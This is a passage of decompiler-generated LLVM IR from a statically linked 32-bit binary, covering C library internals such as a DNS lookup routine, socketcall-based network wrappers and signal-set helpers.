  %v5_805e64b = call i32 @memcpy(i16* %tmp59, i32 %tmp30, i32 %v1_805e5db)
  store i32 %v1_805e5d8, i32* @eax, align 4
  %v0_805e654 = load i32, i32* @ebp, align 4
  %v2_805e654 = inttoptr i32 %v1_805e5d8 to i32*
  store i32 %v0_805e654, i32* %v2_805e654, align 4
  %v0_805e656 = load i32, i32* @edi, align 4
  store i32 %v0_805e656, i32* @esi, align 4
  %v1_805e65f = add i32 %tmp30, -1
  %v2_805e68461 = icmp slt i32 %v1_805e65f, 0
  %v1_805e68662 = icmp eq i1 %v2_805e68461, false
  br i1 %v1_805e68662, label %dec_label_pc_805e662, label %dec_label_pc_805e644.dec_label_pc_805e688_crit_edge

dec_label_pc_805e644.dec_label_pc_805e688_crit_edge: ; preds = %dec_label_pc_805e644
  br label %dec_label_pc_805e688

dec_label_pc_805e662:                             ; preds = %dec_label_pc_805e644, %dec_label_pc_805e662
  %v0_805e66664 = phi i32 [ %v0_805e684.pre, %dec_label_pc_805e662 ], [ %v1_805e65f, %dec_label_pc_805e644 ]
  %v0_805e67963 = phi i32 [ %v2_805e67f, %dec_label_pc_805e662 ], [ %v0_805e656, %dec_label_pc_805e644 ]
  %v0_805e662 = load i32, i32* @ebp, align 4
  %v2_805e662 = add i32 %v0_805e662, %v0_805e66664
  %v3_805e662 = inttoptr i32 %v2_805e662 to i8*
  %v4_805e662 = load i8, i8* %v3_805e662, align 1
  %v1_805e666 = add i32 %v0_805e66664, -1
  store i32 %v1_805e666, i32* @ebx, align 4
  %tmp72 = urem i8 %v4_805e662, 16
  %v1_805e669 = zext i8 %tmp72 to i32
  store i32 %v1_805e669, i32* %eax.global-to-local, align 4
  %v3_805e66c = udiv i8 %v4_805e662, 16
  %v8_805e66c = zext i8 %v3_805e66c to i32
  store i32 %v8_805e66c, i32* %edx.global-to-local, align 4
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806dae1.765, i32 0, i32 0), i8** %stack_var_-120, align 4
  store i32 %v0_805e67963, i32* %stack_var_-124, align 4
  %v3_805e67a = call i32 @sprintf(i32 %v0_805e67963, i32 ptrtoint ([7 x i8]* @global_var_806dae1.765 to i32))
  store i32 %v3_805e67a, i32* @eax, align 4
  %v0_805e67f = load i32, i32* @esi, align 4
  %v2_805e67f = add i32 %v0_805e67f, %v3_805e67a
  store i32 %v2_805e67f, i32* @esi, align 4
  %v0_805e684.pre = load i32, i32* @ebx, align 4
  %v2_805e684 = icmp slt i32 %v0_805e684.pre, 0
  %v1_805e686 = icmp eq i1 %v2_805e684, false
  br i1 %v1_805e686, label %dec_label_pc_805e662, label %dec_label_pc_805e688

dec_label_pc_805e688:                             ; preds = %dec_label_pc_805e662, %dec_label_pc_805e644.dec_label_pc_805e688_crit_edge
  %v0_805e679.lcssa = phi i32 [ %v0_805e656, %dec_label_pc_805e644.dec_label_pc_805e688_crit_edge ], [ %v2_805e67f, %dec_label_pc_805e662 ]
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806dae8.766, i32 0, i32 0), i8** %stack_var_-120, align 4
  store i32 %v0_805e679.lcssa, i32* %stack_var_-124, align 4
  %v3_805e690 = inttoptr i32 %v0_805e679.lcssa to i8*
  %v4_805e690 = call i32 @strcpy(i8* %v3_805e690, i32 ptrtoint ([9 x i8]* @global_var_806dae8.766 to i32))
  br label %dec_label_pc_805e698

dec_label_pc_805e698:                             ; preds = %dec_label_pc_805e60d, %dec_label_pc_805e688
  %storemerge20 = phi i32 [ %v4_805e63a, %dec_label_pc_805e60d ], [ %v4_805e690, %dec_label_pc_805e688 ]
  store i32 %storemerge20, i32* %eax.global-to-local, align 4
  store i32 %v1_805e5c7, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  %v1_805e69e = add i32 %v0_805e5c7, 8
  %v2_805e69e = inttoptr i32 %v1_805e69e to i32*
  store i32 0, i32* %v2_805e69e, align 4
  store i32 %v1_805e5d5, i32* @ecx, align 4
  %v0_805e6a9 = load i32, i32* @edi, align 4
  %v2_805e6a9 = inttoptr i32 %v1_805e5d5 to i32*
  store i32 %v0_805e6a9, i32* %v2_805e6a9, align 4
  %v0_805e6ab = load i32, i32* @ecx, align 4
  %v1_805e6ab = add i32 %v0_805e6ab, 4
  %v2_805e6ab = inttoptr i32 %v1_805e6ab to i32*
  store i32 0, i32* %v2_805e6ab, align 4
  %v2_805e6bd = ptrtoint i32* %stack_var_-36 to i32
  %v2_805e6ea = ptrtoint i32* %stack_var_-20 to i32
  %v8_805e732 = inttoptr i32 %tmp22 to i8*
  %v9_805e728 = icmp eq i32 %tmp23, 5
  %v1_805e72b = icmp eq i1 %v9_805e728, false
  br label %dec_label_pc_805e6b2

dec_label_pc_805e6b2:                             ; preds = %dec_label_pc_805e756, %dec_label_pc_805e698
  store i8* inttoptr (i32 134583465 to i8*), i8** %stack_var_-120, align 4
  store i32 %v2_805e6bd, i32* @ebx, align 4
  store i32 %v2_805e6bd, i32* %stack_var_-124, align 4
  %v5_805e6c2 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-36, i32 134583465, i32 ptrtoint (i32* @global_var_807400c.761 to i32))
  store i32 %v5_805e6c2, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807400c.761 to i32), i32* %stack_var_-124, align 4
  %v1_805e6ce = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807400c.761 to i32))
  %v2_805e6d3 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805e6d3, i32* @ecx, align 4
  %v2_805e6d4 = load i8*, i8** %stack_var_-120, align 4
  %v3_805e6d4 = ptrtoint i8* %v2_805e6d4 to i32
  store i32 %v3_805e6d4, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-120, align 4
  store i32 %v2_805e6bd, i32* %stack_var_-124, align 4
  %v4_805e6de = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-36, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  store i8* %v4_805e504, i8** %stack_var_-120, align 4
  store i32 %v2_805e6ea, i32* %eax.global-to-local, align 4
  store i32 %v2_805e6ea, i32* %stack_var_-124, align 4
  %v0_805e6f4 = load i32, i32* @esi, align 4
  %v0_805e6f7 = load i32, i32* @edi, align 4
  %v5_805e6f7 = inttoptr i32 %v0_805e6f7 to i8*
  store i8* %v5_805e6f7, i8** %stack_var_-140, align 4
  %v10_805e6f8 = call i32 @__dns_lookup(i8* %v5_805e6f7, i32 12, i32 %v0_805e6f4, i32 ptrtoint (i32* @global_var_807e554.763 to i32), i32 %v2_805e6ea, i32 %v2_805e4fa)
  store i32 %v10_805e6f8, i32* %eax.global-to-local, align 4
  %v2_805e700 = icmp slt i32 %v10_805e6f8, 0
  br i1 %v2_805e700, label %dec_label_pc_805e80d, label %dec_label_pc_805e708

dec_label_pc_805e708:                             ; preds = %dec_label_pc_805e6b2
  %v3_805e70d = load i32, i32* %stack_var_-76, align 4
  %v8_805e70d = inttoptr i32 %v3_805e70d to i8*
  store i8* %v8_805e70d, i8** %stack_var_-120, align 4
  %v0_805e711 = load i32, i32* @edi, align 4
  store i32 %v0_805e711, i32* %stack_var_-124, align 4
  %v4_805e712 = inttoptr i32 %v0_805e711 to i8*
  %v5_805e712 = call i32 @strncpy(i8* %v4_805e712, i32 %v3_805e70d, i32 %stack_var_-92.0)
  store i32 %v5_805e712, i32* %eax.global-to-local, align 4
  %v2_805e717 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805e717, i32* @ecx, align 4
  %v3_805e718 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805e718, i32* %stack_var_-124, align 4
  %v1_805e71c = call i32 @free(i32 %v3_805e718)
  store i32 %tmp23, i32* %eax.global-to-local, align 4
  br i1 %v1_805e72b, label %dec_label_pc_805e772, label %dec_label_pc_805e72d

dec_label_pc_805e72d:                             ; preds = %dec_label_pc_805e708
  %v0_805e731 = load i32, i32* @edi, align 4
  store i8* %v8_805e732, i8** %stack_var_-120, align 4
  %v3_805e736 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e736, i32* %stack_var_-124, align 4
  %v5_805e73a = call i32 @__decode_dotted(i32 %v3_805e736, i32 %tmp22, i32 %v0_805e731, i32 %stack_var_-92.0)
  store i32 %v5_805e73a, i32* %eax.global-to-local, align 4
  %v2_805e73f = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805e73f, i32* %edx.global-to-local, align 4
  %v3_805e740 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e740, i32* %stack_var_-124, align 4
  store i32 %v5_805e73a, i32* @ebx, align 4
  %v1_805e746 = call i32 @free(i32 %v3_805e740)
  store i32 %v1_805e746, i32* %eax.global-to-local, align 4
  %v2_805e74e = icmp slt i32 %v5_805e73a, 0
  br i1 %v2_805e74e, label %dec_label_pc_805e821, label %dec_label_pc_805e756

dec_label_pc_805e756:                             ; preds = %dec_label_pc_805e72d
  %v0_805e756 = load i32, i32* @ebp, align 4
  %v1_805e756 = add i32 %v0_805e756, 1
  store i32 %v1_805e756, i32* @ebp, align 4
  %v7_805e75a = icmp sgt i32 %v1_805e756, 5
  br i1 %v7_805e75a, label %dec_label_pc_805e760, label %dec_label_pc_805e6b2

dec_label_pc_805e760:                             ; preds = %dec_label_pc_805e756
  store i32 %tmp29, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e82e

dec_label_pc_805e772:                             ; preds = %dec_label_pc_805e708
  %v9_805e772 = icmp eq i32 %tmp23, 12
  %v1_805e775 = icmp eq i1 %v9_805e772, false
  br i1 %v1_805e775, label %dec_label_pc_805e7e3, label %dec_label_pc_805e777

dec_label_pc_805e777:                             ; preds = %dec_label_pc_805e772
  %v0_805e77b = load i32, i32* @edi, align 4
  store i8* %v8_805e732, i8** %stack_var_-120, align 4
  %v3_805e780 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e780, i32* %stack_var_-124, align 4
  %v5_805e784 = call i32 @__decode_dotted(i32 %v3_805e780, i32 %tmp22, i32 %v0_805e77b, i32 %stack_var_-92.0)
  %v2_805e789 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805e789, i32* %eax.global-to-local, align 4
  %v3_805e78a = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e78a, i32* %stack_var_-124, align 4
  %v1_805e78e = call i32 @free(i32 %v3_805e78a)
  store i32 %tmp28, i32* %edx.global-to-local, align 4
  %v0_805e79a = load i32, i32* @edi, align 4
  %v2_805e79a = inttoptr i32 %tmp28 to i32*
  store i32 %v0_805e79a, i32* %v2_805e79a, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805e7ab = load i32, i32* %edx.global-to-local, align 4
  %v2_805e7ab = add i32 %v1_805e7ab, 8
  %v3_805e7ab = inttoptr i32 %v2_805e7ab to i32*
  store i32 %tmp31, i32* %v3_805e7ab, align 4
  %v2_805e7ae = zext i1 %v1_805e60b to i32
  %v3_805e7ae = load i32, i32* %eax.global-to-local, align 4
  %v4_805e7ae = and i32 %v3_805e7ae, -256
  %v5_805e7ae = or i32 %v4_805e7ae, %v2_805e7ae
  %v1_805e7b221 = add i32 %v5_805e7ae, 15
  %v1_805e7b5 = and i32 %v1_805e7b221, -236
  %v1_805e7b8 = load i32, i32* %edx.global-to-local, align 4
  %v2_805e7b8 = add i32 %v1_805e7b8, 12
  %v3_805e7b8 = inttoptr i32 %v2_805e7b8 to i32*
  store i32 %v1_805e7b5, i32* %v3_805e7b8, align 4
  %v1_805e7bf = load i32, i32* %edx.global-to-local, align 4
  %v2_805e7bf = add i32 %v1_805e7bf, 16
  %v3_805e7bf = inttoptr i32 %v2_805e7bf to i32*
  store i32 %v1_805e5c7, i32* %v3_805e7bf, align 4
  %v1_805e7c6 = load i32, i32* %edx.global-to-local, align 4
  %v2_805e7c6 = add i32 %v1_805e7c6, 4
  %v3_805e7c6 = inttoptr i32 %v2_805e7c6 to i32*
  store i32 %v1_805e5d5, i32* %v3_805e7c6, align 4
  %v0_805e7d0 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805e7d0, i32* %v1_805e4ee, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %tmp29, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_805e56f, align 4
  br label %dec_label_pc_805e838

dec_label_pc_805e7e3:                             ; preds = %dec_label_pc_805e772
  %v3_805e7e6 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e7e6, i32* %stack_var_-124, align 4
  %v1_805e7ea = call i32 @free(i32 %v3_805e7e6)
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 4, i32* %v1_805e56f, align 4
  br label %dec_label_pc_805e838

dec_label_pc_805e806:                             ; preds = %dec_label_pc_805e52c, %dec_label_pc_805e513, %entry
  store i32 22, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e838

dec_label_pc_805e80d:                             ; preds = %dec_label_pc_805e6b2
  store i32 1, i32* %v1_805e56f, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e838

dec_label_pc_805e821:                             ; preds = %dec_label_pc_805e72d
  store i32 %tmp29, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805e82e

dec_label_pc_805e82e:                             ; preds = %dec_label_pc_805e760, %dec_label_pc_805e821
  store i32 3, i32* %v1_805e56f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e838

dec_label_pc_805e833:                             ; preds = %dec_label_pc_805e5c7, %dec_label_pc_805e5bb, %dec_label_pc_805e5b2, %dec_label_pc_805e5a6, %dec_label_pc_805e59a, %dec_label_pc_805e57f
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e838

dec_label_pc_805e838:                             ; preds = %dec_label_pc_805e576, %dec_label_pc_805e532, %dec_label_pc_805e82e, %dec_label_pc_805e80d, %dec_label_pc_805e806, %dec_label_pc_805e7e3, %dec_label_pc_805e777, %dec_label_pc_805e833
  store i32 %v0_805e4ce, i32* @esi, align 4
  store i32 %v0_805e4cd, i32* @edi, align 4
  store i32 %v0_805e4cc, i32* @ebp, align 4
  %v0_805e83f = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805e83f

; uselistorder directives
  uselistorder i32 %v5_805e73a, { 1, 0, 2 }
  uselistorder i32 %v0_805e684.pre, { 1, 0 }
  uselistorder i32 %v2_805e67f, { 0, 2, 1 }
  uselistorder i8 %v4_805e662, { 1, 0 }
  uselistorder i16* %tmp59, { 1, 0 }
  uselistorder i32 %stack_var_-92.0, { 3, 2, 1, 0 }
  uselistorder i1 %v10_805e5e6, { 1, 0 }
  uselistorder i32 %v1_805e5db, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805e5d8, { 1, 0, 2 }
  uselistorder i32 %v1_805e5d5, { 1, 3, 2, 0 }
  uselistorder i32 %v1_805e5c7, { 1, 2, 0 }
  uselistorder i32 %v0_805e5c7, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_805e59a, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %v1_805e56f, { 2, 4, 0, 3, 1, 5 }
  uselistorder i32* %stack_var_-76, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-120, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-124, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 17, 20, 21 }
  uselistorder i8** %stack_var_-140, { 2, 1, 3, 0 }
  uselistorder i32 %tmp31, { 3, 2, 4, 0, 1 }
  uselistorder i32 %tmp30, { 6, 2, 3, 0, 1, 5, 4 }
  uselistorder i32 %tmp29, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp28, { 2, 1, 0 }
  uselistorder i32 %tmp23, { 0, 2, 1 }
  uselistorder i8** %tmp, { 2, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 30, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 24, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 29, 31, 32, 33, 34 }
  uselistorder i32 (i32, i32, i32)* @__open_nameservers, { 2, 1, 0 }
  uselistorder i8* %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805e838, { 7, 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_805e82e, { 1, 0 }
  uselistorder label %dec_label_pc_805e698, { 1, 0 }
  uselistorder label %dec_label_pc_805e662, { 1, 0 }
  uselistorder label %dec_label_pc_805e52c, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805e85b = ptrtoint i32* %stack_var_-12 to i32
  %v2_805e862 = call i32 @__socketcall(i32 5, i32 %v2_805e85b)
  ret i32 %v2_805e862

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805e887 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805e88e = call i32 @__socketcall(i32 2, i32 %v2_805e887)
  ret i32 %v2_805e88e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805e8b3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805e8ba = call i32 @__socketcall(i32 3, i32 %v2_805e8b3)
  ret i32 %v2_805e8ba

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805e8ef = ptrtoint i32* %stack_var_-20 to i32
  %v2_805e8f6 = call i32 @__socketcall(i32 15, i32 %v2_805e8ef)
  ret i32 %v2_805e8f6

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_805e913 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805e91a = call i32 @__socketcall(i32 4, i32 %v2_805e913)
  ret i32 %v2_805e91a

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805e947 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805e94e = call i32 @__socketcall(i32 10, i32 %v2_805e947)
  ret i32 %v2_805e94e

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805e98b = ptrtoint i32* %stack_var_-24 to i32
  %v2_805e992 = call i32 @__socketcall(i32 12, i32 %v2_805e98b)
  ret i32 %v2_805e992

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805e9b7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805e9be = call i32 @__socketcall(i32 17, i32 %v2_805e9b7)
  ret i32 %v2_805e9be

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805e9eb = ptrtoint i32* %stack_var_-16 to i32
  %v2_805e9f2 = call i32 @__socketcall(i32 9, i32 %v2_805e9eb)
  ret i32 %v2_805e9f2

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805ea17 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805ea1e = call i32 @__socketcall(i32 16, i32 %v2_805ea17)
  ret i32 %v2_805ea1e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805ea5b = ptrtoint i32* %stack_var_-24 to i32
  %v2_805ea62 = call i32 @__socketcall(i32 11, i32 %v2_805ea5b)
  ret i32 %v2_805ea62

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805ea97 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805ea9e = call i32 @__socketcall(i32 14, i32 %v2_805ea97)
  ret i32 %v2_805ea9e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805eac3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805eaca = call i32 @__socketcall(i32 1, i32 %v2_805eac3)
  ret i32 %v2_805eaca

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 0, 1, 8, 12, 7, 11, 10, 5, 4, 9, 6, 2, 3 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805eaec, label %dec_label_pc_805eadf

dec_label_pc_805eadf:                             ; preds = %entry
  %v1_805eadf = add i32 %arg1, -64
  %v3_805eadf = sub i32 63, %arg1
  %v4_805eadf = and i32 %v3_805eadf, %arg1
  %v5_805eadf = icmp slt i32 %v4_805eadf, 0
  %v6_805eadf = icmp eq i32 %v1_805eadf, 0
  %v7_805eadf = icmp slt i32 %v1_805eadf, 0
  %v3_805eae2 = icmp eq i1 %v7_805eadf, %v5_805eadf
  %v4_805eae2 = icmp eq i1 %v6_805eadf, false
  %v5_805eae2 = and i1 %v4_805eae2, %v3_805eae2
  br i1 %v5_805eae2, label %dec_label_pc_805eaec, label %dec_label_pc_805eae4

dec_label_pc_805eae4:                             ; preds = %dec_label_pc_805eadf
  %v4_805eae7 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805eaec

dec_label_pc_805eaec:                             ; preds = %dec_label_pc_805eadf, %entry, %dec_label_pc_805eae4
  %v1_805eaec = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805eaf1 = inttoptr i32 %v1_805eaec to i32*
  store i32 22, i32* %v1_805eaf1, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805eadf, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805eaec, { 2, 0, 1 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805eb18, label %dec_label_pc_805eb0b

dec_label_pc_805eb0b:                             ; preds = %entry
  %v1_805eb0b = add i32 %arg1, -64
  %v3_805eb0b = sub i32 63, %arg1
  %v4_805eb0b = and i32 %v3_805eb0b, %arg1
  %v5_805eb0b = icmp slt i32 %v4_805eb0b, 0
  %v6_805eb0b = icmp eq i32 %v1_805eb0b, 0
  %v7_805eb0b = icmp slt i32 %v1_805eb0b, 0
  %v3_805eb0e = icmp eq i1 %v7_805eb0b, %v5_805eb0b
  %v4_805eb0e = icmp eq i1 %v6_805eb0b, false
  %v5_805eb0e = and i1 %v4_805eb0e, %v3_805eb0e
  br i1 %v5_805eb0e, label %dec_label_pc_805eb18, label %dec_label_pc_805eb10

dec_label_pc_805eb10:                             ; preds = %dec_label_pc_805eb0b
  %v0_805eb13 = call i32 @__sigdelset()
  br label %dec_label_pc_805eb18

dec_label_pc_805eb18:                             ; preds = %dec_label_pc_805eb0b, %entry, %dec_label_pc_805eb10
  %v1_805eb18 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805eb1d = inttoptr i32 %v1_805eb18 to i32*
  store i32 22, i32* %v1_805eb1d, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805eb0b, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805eb18, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805eb3a = inttoptr i32 %arg1 to i8*
  %v4_805eb3a = call i32 @__GI_memset(i8* %v3_805eb3a, i32 0, i32 128)
  ret i32 0
}

define i32 @sigfillset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805eb59 = inttoptr i32 %arg1 to i8*
  %v4_805eb59 = call i32 @__GI_memset(i8* %v3_805eb59, i32 255, i32 128)
  ret i32 0
}

define i32 @sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805eb7c, label %dec_label_pc_805eb6f

dec_label_pc_805eb6f:                             ; preds = %entry
  %v1_805eb6f = add i32 %arg1, -64
  %v3_805eb6f = sub i32 63, %arg1
  %v4_805eb6f = and i32 %v3_805eb6f, %arg1
  %v5_805eb6f = icmp slt i32 %v4_805eb6f, 0
  %v6_805eb6f = icmp eq i32 %v1_805eb6f, 0
  %v7_805eb6f = icmp slt i32 %v1_805eb6f, 0
  %v3_805eb72 = icmp eq i1 %v7_805eb6f, %v5_805eb6f
  %v4_805eb72 = icmp eq i1 %v6_805eb6f, false
  %v5_805eb72 = and i1 %v4_805eb72, %v3_805eb72
  br i1 %v5_805eb72, label %dec_label_pc_805eb7c, label %dec_label_pc_805eb74

dec_label_pc_805eb74:                             ; preds = %dec_label_pc_805eb6f
  %v4_805eb77 = call i32 @__sigismember(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805eb7c

dec_label_pc_805eb7c:                             ; preds = %dec_label_pc_805eb6f, %entry, %dec_label_pc_805eb74
  %v1_805eb7c = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805eb81 = inttoptr i32 %v1_805eb7c to i32*
  store i32 22, i32* %v1_805eb81, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805eb6f, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805eb7c, { 2, 0, 1 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v0_805eb90 = load i32, i32* @ebx, align 4
  store i32 %tmp2, i32* @ebx, align 4
  %v4_805eb98 = icmp eq i32 %tmp, 0
  br i1 %v4_805eb98, label %dec_label_pc_805ebb9, label %dec_label_pc_805eb9f

dec_label_pc_805eb9f:                             ; preds = %entry
  %v1_805eba0 = add i32 %tmp2, 28
  %v4_805eba8 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* null, i32 %v1_805eba0)
  %v1_805ebb5 = icmp eq i32 %v4_805eba8, 0
  br i1 %v1_805ebb5, label %dec_label_pc_805ebbb, label %dec_label_pc_805ebb9

dec_label_pc_805ebb9:                             ; preds = %dec_label_pc_805eb9f, %entry
  br label %dec_label_pc_805ebbb

dec_label_pc_805ebbb:                             ; preds = %dec_label_pc_805eb9f, %dec_label_pc_805ebb9
  %v0_805ebbb = phi i32 [ 1, %dec_label_pc_805eb9f ], [ 0, %dec_label_pc_805ebb9 ]
  %v1_805ebbb = load i32, i32* @ebx, align 4
  %v2_805ebbb = add i32 %v1_805ebbb, 24
  %v3_805ebbb = inttoptr i32 %v2_805ebbb to i32*
  store i32 %v0_805ebbb, i32* %v3_805ebbb, align 4
  store i32 %v0_805eb90, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
